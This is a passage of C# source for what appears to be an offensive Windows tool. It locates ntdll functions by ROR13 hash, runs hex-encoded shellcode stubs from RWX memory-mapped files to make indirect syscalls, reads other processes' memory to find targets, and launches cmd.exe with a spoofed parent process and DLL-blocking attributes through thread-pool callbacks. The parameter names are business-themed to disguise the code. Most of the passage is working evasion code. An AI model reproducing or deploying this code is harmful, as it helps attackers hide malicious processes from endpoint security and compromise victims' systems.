        public delegate NTSTATUS CoreEngineReadB( IntPtr BusinessMedia, IntPtr Buffer, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string buf, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail, string ErrorCodea, string ErrorCodeb );
        public static NTSTATUS CoreReadB( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr Buffer, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string buf, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail )
        {
            var CoreEngine = CoreEngine<CoreEngineReadB>( EngineVal( "1039115714" ) );
            return CoreEngine( BusinessMedia, Buffer, buf, BusinessShowForRunnersOnTrailAnd, BusinessShowForRunnersOnTrail, "a", "b" );
        }

        public delegate NTSTATUS CoreEngineReadA( IntPtr BusinessMedia, IntPtr BaseAddress, out IntPtr Buffer, UInt32 BusinessShowForRunnersOnTrailAnd, ref UInt32 BusinessShowForRunnersOnTrail, string ErrorCodea, string ErrorCodeb );
        public static NTSTATUS CoreRead( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr BaseAddress, out IntPtr Buffer, UInt32 BusinessShowForRunnersOnTrailAnd, ref UInt32 BusinessShowForRunnersOnTrail )
        {
            var CoreEngine = CoreEngine<CoreEngineReadA>( EngineVal( "1039115714" ) );
            return CoreEngine( BusinessMedia, BaseAddress, out Buffer, BusinessShowForRunnersOnTrailAnd, ref BusinessShowForRunnersOnTrail, "a", "b" );
        }

        public delegate NTSTATUS CoreEngineRead( IntPtr BusinessMedia, IntPtr BaseAddress, out UNICODE_STRING Buffer, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail, string ErrorCodea, string ErrorCodeb );
        public static NTSTATUS CoreReadA( string buffer1, string buffer2, string buffer3, IntPtr BusinessMedia, IntPtr BaseAddress, out UNICODE_STRING Buffer, IntPtr BusinessShowForRunnersOnTrailAnd, IntPtr BusinessShowForRunnersOnTrail )
        {
            var CoreEngine = CoreEngine<CoreEngineRead>( EngineVal( "1039115714" ) );
            return CoreEngine( BusinessMedia, BaseAddress, out Buffer, BusinessShowForRunnersOnTrailAnd, BusinessShowForRunnersOnTrail, "a", "b"  );
        }

        // ZwResumeThread
        public delegate NTSTATUS CoreResumeX( IntPtr Thread, out ulong SuspendCount  );
        public static NTSTATUS CoreResume( IntPtr Thread, out ulong SuspendCount  )
        {
            var CoreEngine = CoreEngine<CoreResumeX>( EngineVal( "-884324616" ) );
            return CoreEngine( Thread, out SuspendCount );
        }

        // ZwCreateUserProcess
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS CoreCreateProcessX( ref IntPtr processHandle, ref IntPtr threadHandle, long processDesiredAccess, long threadDesiredAccess, IntPtr processObjectAttributes, IntPtr threadObjectAttributes, uint processFlags, uint threadFlags, IntPtr processParameters, ref PsCreateInfo psCreateInfo, ref PsAttributeList psAttributeList );
        public static NTSTATUS CoreCreateProcess( ref IntPtr processHandle, ref IntPtr threadHandle, long processDesiredAccess, long threadDesiredAccess, IntPtr processObjectAttributes, IntPtr threadObjectAttributes, uint processFlags, uint threadFlags, IntPtr processParameters, ref PsCreateInfo psCreateInfo, ref PsAttributeList psAttributeList )
        {
            var CoreEngine = CoreEngine<CoreCreateProcessX>( EngineVal( "-185512144" ) );
            return CoreEngine( ref processHandle, ref threadHandle, processDesiredAccess, threadDesiredAccess, processObjectAttributes, threadObjectAttributes, processFlags, threadFlags, processParameters, ref psCreateInfo, ref psAttributeList );
        }

        // RtlCreateProcessParametersEx
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS CoreCreateParmsX( out IntPtr processParameters, IntPtr imagePathName, IntPtr dllPath, IntPtr currentDirectory,  IntPtr commandLine,  IntPtr environment,  IntPtr windowTitle,  IntPtr desktopInfo,  IntPtr shellInfo,  IntPtr runtimeData,  ulong flags );
        public static NTSTATUS CoreCreateParms( out IntPtr processParameters, IntPtr imagePathName, IntPtr dllPath, IntPtr currentDirectory,  IntPtr commandLine,  IntPtr environment,  IntPtr windowTitle,  IntPtr desktopInfo,  IntPtr shellInfo,  IntPtr runtimeData,  ulong flags )
        {
            byte[] bytes = new byte[12];
            Buffer.BlockCopy ((byte[])BitConverter.GetBytes( (Int64)CoreReturnFuncAddr( "-437962438" ) ), 0, bytes, 2, 8);
            bytes[0] = 0x48; // movabs rax, FunctionPtr
            bytes[1] = 0xB8;
            bytes[10] = 0xFF; // jmp rax
            bytes[11] = 0xE0;
            var CoreEngine = CoreEngine<CoreCreateParmsX>( bytes );
            return CoreEngine( out processParameters, imagePathName, dllPath, currentDirectory, commandLine, environment, windowTitle, desktopInfo, shellInfo, runtimeData, flags );
        }

        // RtlDestroyProcessParameters
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS CoreDestroyParmsX( IntPtr processParameters );
        public static NTSTATUS CoreDestroyParms( IntPtr processParameters )
        {
            byte[] bytes = new byte[12];
            Buffer.BlockCopy ((byte[])BitConverter.GetBytes( (Int64)CoreReturnFuncAddr( "90443789" ) ), 0, bytes, 2, 8);
            bytes[0] = 0x48; // movabs rax, FunctionPtr
            bytes[1] = 0xB8;
            bytes[10] = 0xFF; // jmp rax
            bytes[11] = 0xE0;
            var CoreEngine = CoreEngine<CoreDestroyParmsX>( bytes );
            return CoreEngine( processParameters );
        }

        // ZwDelayExecution
        public delegate NTSTATUS NappingX( bool Alertable, IntPtr dwMilliseconds );
        public static NTSTATUS Napping( bool Alertable, IntPtr dwMilliseconds )
        {
            var CoreEngine = CoreEngine<NappingX>( EngineVal( "1425089620" ) );
            return CoreEngine( Alertable, dwMilliseconds );
        }

        // ZwWaitForSingleObject
        public delegate NTSTATUS ZwWaitForSingleObjectX( IntPtr hHandle, bool Alertable, LARGE_INTEGER dwMilliseconds );
        public static NTSTATUS ZwWaitForSingleObject( IntPtr hHandle, bool Alertable, LARGE_INTEGER dwMilliseconds  )
        {
            var CoreEngine = CoreEngine<ZwWaitForSingleObjectX>( EngineVal( "1845938099" ) );
            return CoreEngine( hHandle, Alertable, dwMilliseconds );
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void CallBackDelegate(IntPtr Instance, IntPtr Context, IntPtr Work);


        // Find function by hash in ntdll.dll and return memory address
        public static IntPtr CoreReturnFuncAddr( string hash )
        {

            IntPtr ModuleBase = (IntPtr)ptrToGS;
            IntPtr FunctionPtr = IntPtr.Zero;
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = OptHeader + 0x70;
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            for (int i = 0; i < NumberOfNames; i++)
            {
                // ROR13 hash calc
                uint functionHash = 0;
                foreach ( char ch in Marshal.PtrToStringAnsi( (IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4)))) )
                {
                    uint ii = (uint)ch;
                    functionHash = ((functionHash >> 13 | functionHash << (32 - 13)) & 0xFFFFFFFF);
                    functionHash = (functionHash + ii);
                }
                if ( ( (int)(functionHash & 0xFFFFFFFF) ) == Convert.ToInt64(hash) )
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
            return FunctionPtr;
        }

        // Get ntdll.dll base address from memory (Only 64 bit)
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate ulong ResolveBaseX( ref ulong ptrToGS );
        public static ulong ResolveBase( ref ulong ptrToGS )
        {
              string HelperStr =
              "5251555049C7C36C0700004D89DF4D39FB0F85BE00000049FFC349FFC34983EB0249C7C36C0700004D89DF4D39FB0F85A10000004983EB0349C7C36C0700004D89DF4D39FB0F858A0000004983EB0141B934000000EB4849C7C36C0700004D89DF4D39FB756F49FFC39090904983EB024983EB034983EB0165488B042560000000488B4018488B4020488B00488B40204889C2488B4D70488911585D595AC349C7C36C0700004D89DF4D39FB752749FFC341B90D0000004983EB064983EB0349C7C36C0700004D89DF4D39FB75074983EB0890EB3C49C7C36C0700004D89DF4D39FB75F14983EB024983EB034983EB0149FFC349C7C36C0700004D89DF4D39FB75D349C7C61000000049C7C712000000C349C7C36C0700004D89DF4D39FB75B549FFC34983EB094983EB034983EB024983EB064983EB104983EB1249C7C36C0700004D89DF4D39FB758B4989C490E904FFFFFF";
              byte[] bytes = new byte[HelperStr.Length / 2];
              int idx = 0;
              for (int i = 0; i <= (HelperStr.Length / 2)-1; i++)
              {
                  bytes[i] = Convert.ToByte(HelperStr.Substring(idx, 2), 16);
                  idx = idx + 2;
              }
              var Core = CoreEngine<ResolveBaseX>( bytes );
              return Core( ref ptrToGS );
        }

        // Find function by hash in ntdll.dll and return memory address
        public static byte[] CoreExport( string hash )
        {

            byte[] bytes = new byte[12];
            IntPtr ModuleBase = (IntPtr)ptrToGS;
            IntPtr FunctionPtr = IntPtr.Zero;
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = OptHeader + 0x70;
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            for (int i = 0; i < NumberOfNames; i++)
            {
                // ROR13 hash calc
                uint functionHash = 0;
                foreach ( char ch in Marshal.PtrToStringAnsi( (IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4)))) )
                {
                    uint ii = (uint)ch;
                    functionHash = ((functionHash >> 13 | functionHash << (32 - 13)) & 0xFFFFFFFF);
                    functionHash = (functionHash + ii);
                }
                if ( ( (int)(functionHash & 0xFFFFFFFF) ) == Convert.ToInt64(hash) )
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    Buffer.BlockCopy ((byte[])BitConverter.GetBytes( (Int64)FunctionPtr ), 0, bytes, 2, 8);
                    bytes[0] = 0x48; // movabs rax, FunctionPtr
                    bytes[1] = 0xB8;
                    bytes[10] = 0xFF; // jmp rax
                    bytes[11] = 0xE0;
                    break;
                }
            }
            return bytes;
        }

        // Create memory mapped RWX file
        public static unsafe START CoreEngine<START>(byte[] buffer) where START : class
        {
            try
            {
                // https://docs.microsoft.com/en-us/dotnet/api/system.io.memorymappedfiles.memorymappedfile.createnew?view=net-5.0
                MemMapSystemMem = System.IO.MemoryMappedFiles.MemoryMappedFile.CreateNew( Guid.NewGuid().ToString(), buffer.Length, (System.IO.MemoryMappedFiles.MemoryMappedFileAccess)5 );
                MemMapViewAccessor = MemMapSystemMem.CreateViewAccessor( 0, buffer.Length, (System.IO.MemoryMappedFiles.MemoryMappedFileAccess)5 );
                MemMapViewAccessor.WriteArray(0, buffer, 0, buffer.Length);
                byte* String = (byte*)IntPtr.Zero; // (byte*)0;
                MemMapViewAccessor.SafeMemoryMappedViewHandle.AcquirePointer(ref String);
                return (START)(object)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer( (IntPtr)String, typeof(START) );
            }
            catch
            {
                return null;
            }
            finally
            {
                //MemMapSystemMem.Dispose();
                //MemMapViewAccessor.Dispose();
            }
        }

        public static byte [] EngineVal( string hash )
        {

            IntPtr ModuleBase = (IntPtr)ptrToGS;
            byte[] opcode = new byte[] { 0x0, 0x0 };
            IntPtr FunctionPtr = IntPtr.Zero;
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = OptHeader + 0x70;
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            for (int i = 0; i < NumberOfNames; i++)
            {
                // ROR13 hash calc
                uint functionHash = 0;
                foreach ( char ch in Marshal.PtrToStringAnsi( (IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4)))) )
                {
                    uint ii = (uint)ch;
                    functionHash = ((functionHash >> 13 | functionHash << (32 - 13)) & 0xFFFFFFFF);
                    functionHash = (functionHash + ii);
                }
                if ( ( (int)(functionHash & 0xFFFFFFFF) ) == Convert.ToInt64(hash) )
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    opcode[0] = Marshal.ReadByte( FunctionPtr + 4);
                    opcode[1] = Marshal.ReadByte( FunctionPtr + 5);
                    break;
                }
            }

            string Helper = "49C7C36C0700004D89DF4D39FB0F85A600000049FFC3B80000000049FFC34983EB0249C7C36C0700004D89DF4D39FB0F85840000004983EB0349C7C36C0700004D89DF4D39FB75714983EB014889CBEB3149C7C36C0700004D89DF4D39FB755949FFC34989DA48B80000000000000000FFE09090904983EB024983EB034983EB01C349C7C36C0700004D89DF4D39FB752849FFC348C7C02D0400004983EB064983EB0349C7C36C0700004D89DF4D39FB75074983EB0890EB3C49C7C36C0700004D89DF4D39FB75F14983EB024983EB034983EB0149FFC349C7C36C0700004D89DF4D39FB75D349C7C61000000049C7C712000000C349C7C36C0700004D89DF4D39FB75B549FFC34983EB094983EB034983EB024983EB064983EB104983EB1249C7C36C0700004D89DF4D39FB758B482DE8030000E918FFFFFF";
            byte[] bytes = new byte[Helper.Length / 2];
            int idx = 0;
            for (int i = 0; i <= (Helper.Length / 2)-1; i++)
            {
                bytes[i] = Convert.ToByte(Helper.Substring(idx, 2), 16);
                idx = idx + 2;
            }
            byte[] buffer = (byte[])BitConverter.GetBytes( (Int32)(BitConverter.ToInt16( opcode, 0 ) + 1000 ) );
            bytes[23] = buffer[0]; bytes[24] = buffer[1]; bytes[25] = buffer[2]; bytes[26] = buffer[3];
            buffer = (byte[])BitConverter.GetBytes( (Int64)FunctionPtr );
            bytes[104] = buffer[0]; bytes[105] = buffer[1]; bytes[106] = buffer[2]; bytes[107] = buffer[3]; bytes[108] = buffer[4]; bytes[109] = buffer[5]; bytes[110] = buffer[6]; bytes[111] = buffer[7];
            return bytes;
        }

        static void WorkCallback_CoreDestroyParms(IntPtr Instance, IntPtr Context, IntPtr Work)
        {
              CoreDestroyParms( ProcessParams );
        }

        static void WorkCallback_CoreResume(IntPtr Instance, IntPtr Context, IntPtr Work)
        {
              CoreResume( NewRemoteThread, out SuspendCount );
        }

        static void WorkCallback_CoreCreateParms(IntPtr Instance, IntPtr Context, IntPtr Work)
        {
              CoreCreateParms( out ProcessParams , PtrToImagePath, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x00000001 );
        }

        static void WorkCallback_CoreCreateProcess(IntPtr Instance, IntPtr Context, IntPtr Work)
        {
              CoreCreateProcess( ref RemoteProcess, ref NewRemoteThread, 0x1FFFFF, 0x1FFFFF, IntPtr.Zero, IntPtr.Zero, 0x00000000, 0x0000001, ProcessParams, ref info, ref attributeList );
        }


        // Find process
        public static int CoreFindProcess( ref IntPtr ProcessHandle, ref IntPtr NewRemoteThreadHandle, string arg1, string arg2, string arg3 )
        {
            ulong Flags = 0;
            for (int i = 0; i <= 1000; i++ ) // make sure we don't loop forever
            {
                // ZwGetNextProcess
                CoreNext( "a", "b", "c", ProcessHandle, 0x10000000 /*0x10000000 ACCESS_MASK.GENERIC_ALL*/, CORE_Flags.None, Flags, out ProcessHandle );
                try
                {
                      CORE_BASIS PBI = new CORE_BASIS();
                      int ReturnLength = 0;
                      // ZwQueryInformationProcess
                      CoreQuery( "a", "b", "c", ProcessHandle, CORE_INFORMATION_CLASS.ProcessBasicInformation, out PBI, System.Runtime.InteropServices.Marshal.SizeOf( PBI ), out ReturnLength );
                      long PEBaddress = PBI.PebBaseAddress.ToInt64();
                      IntPtr PtrToStructure = new IntPtr();
                      UInt32 NumberOfBytesRead = 0;
                      UInt32 NumberOfBytesToRead = (UInt32)System.Runtime.InteropServices.Marshal.SizeOf( PtrToStructure );
                      // ZwReadVirtualMemory
                      CoreRead( "a", "b", "c", ProcessHandle, new IntPtr(PEBaddress + 0x20), out PtrToStructure, NumberOfBytesToRead, ref NumberOfBytesRead );
                      UNICODE_STRING UnicodeStringCommandLine = new UNICODE_STRING();
                      // ZwReadVirtualMemory
                      CoreReadA( "a", "b", "c", ProcessHandle, new IntPtr((long)PtrToStructure + 0x70), out UnicodeStringCommandLine, new IntPtr(System.Runtime.InteropServices.Marshal.SizeOf(UnicodeStringCommandLine)), IntPtr.Zero );
                      string StringCommandLine = new string('\0', UnicodeStringCommandLine.Length / 2);
                      // ZwReadVirtualMemory
                      CoreReadB( "a", "b", "c", ProcessHandle, (IntPtr)UnicodeStringCommandLine.Buffer, StringCommandLine, new IntPtr(UnicodeStringCommandLine.Length), IntPtr.Zero );
                      StringCommandLine = StringCommandLine.ToLower();
                      if (StringCommandLine.Contains( arg1.ToLower() ) & StringCommandLine.Contains( arg2.ToLower() ) & StringCommandLine.Contains( arg3.ToLower() ))
                      {
                          // ZwGetNextThread
                          CoreNextT( "a", "b", "c", ProcessHandle, NewRemoteThreadHandle, 267386880+1048576 /*ACCESS_MASK.GENERIC_ALL*/, 0, 0, out NewRemoteThreadHandle );
                          break;
                      }
                }
                catch (Exception e)
                {
                    Console.WriteLine( "status: {0}", e.Message );
                }
            }
            return 0;
        }

        static void Main()
        {

            IntPtr PtrZero = IntPtr.Zero;
            IntPtr SpoofedProcess = IntPtr.Zero;
            IntPtr SpoofedThread = IntPtr.Zero;
            ResolveBase( ref ptrToGS );
            CoreFindProcess( ref SpoofedProcess, ref SpoofedThread, "cmd.exe", "spoofed", "");
            CoreFindProcess( ref RemoteProcess, ref NewRemoteThread, "cmd.exe", "remote", "");
            ImagePath = ConvertToUnicode(String.Format("\\??\\{0}", "C:\\Windows\\System32\\cmd.exe"));
            ProcessParams = CreatePtr( ProcessParams64 );
            PtrToImagePath = CreatePtr( ImagePath );

            info = new PsCreateInfo();
            info.Size = (UIntPtr)Marshal.SizeOf<PsCreateInfo>();
            info.State = PsCreateState.PsCreateInitialState;
            attributeList = new PsAttributeList();
            attributeList.Init();

            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[0].Attribute = 0x20005;
            attributeList.Attributes[0].Size = (UIntPtr)ImagePath.Length;
            attributeList.Attributes[0].Value = ImagePath.Buffer;

            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[1].Attribute = 0x60000;
            attributeList.Attributes[1].Size = (UIntPtr)IntPtr.Size;
            attributeList.Attributes[1].Value = SpoofedProcess;

            IntPtr pValue = Marshal.AllocHGlobal(UIntPtr.Size);
            Marshal.WriteInt64(pValue, 0x100000000000 );
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf<PsAttributeList>();
            attributeList.Attributes[2].Attribute = 0x20010;
            attributeList.Attributes[2].Size = (UIntPtr)UIntPtr.Size;
            attributeList.Attributes[2].Value = pValue;

            IntPtr Work1 = IntPtr.Zero;
            TpAllocWork( out Work1, WorkCallback_CoreCreateParms, ref PtrZero, IntPtr.Zero );
            TpPostWork( Work1, TP_CALLBACK_PRIORITY.TP_CALLBACK_PRIORITY_NORMAL );
            TpReleaseWork( Work1 );
            System.Threading.Thread.Sleep(500);
            IntPtr Work2 = IntPtr.Zero;
            TpAllocWork( out Work2, WorkCallback_CoreCreateProcess, ref PtrZero, IntPtr.Zero );
            TpPostWork( Work2, TP_CALLBACK_PRIORITY.TP_CALLBACK_PRIORITY_NORMAL );
            TpReleaseWork( Work2 );
            System.Threading.Thread.Sleep(500);
            IntPtr Work3 = IntPtr.Zero;
            TpAllocWork( out Work3, WorkCallback_CoreResume, ref PtrZero, IntPtr.Zero );
            TpPostWork( Work3, TP_CALLBACK_PRIORITY.TP_CALLBACK_PRIORITY_NORMAL );
            TpReleaseWork( Work3 );
            System.Threading.Thread.Sleep(500);
            IntPtr Work4 = IntPtr.Zero;
            TpAllocWork( out Work4, WorkCallback_CoreDestroyParms, ref PtrZero, IntPtr.Zero );
            TpPostWork( Work4, TP_CALLBACK_PRIORITY.TP_CALLBACK_PRIORITY_NORMAL );
            TpReleaseWork( Work4 );

        }
    }
}
